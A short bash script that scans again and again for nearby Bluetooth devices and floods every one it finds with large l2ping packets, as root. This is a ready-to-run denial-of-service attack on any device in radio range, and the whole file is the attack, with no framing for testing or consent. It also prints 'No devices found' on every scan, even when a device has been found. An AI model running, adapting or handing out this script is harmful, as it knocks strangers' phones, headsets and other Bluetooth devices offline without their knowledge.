#!/bin/bash

scan_count=0

while true; do
    blue_mac=$(hcitool scan | grep -o -E '([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})')
    scan_count=$((scan_count + 1))
    echo "No devices found scan number: $scan_count"
    
    if [ -n "$blue_mac" ]; then
        echo "Device $blue_mac found."
        sudo l2ping -s 660 -f "$blue_mac"
        blue_mac=""
        scan_count=1
    fi
    
done
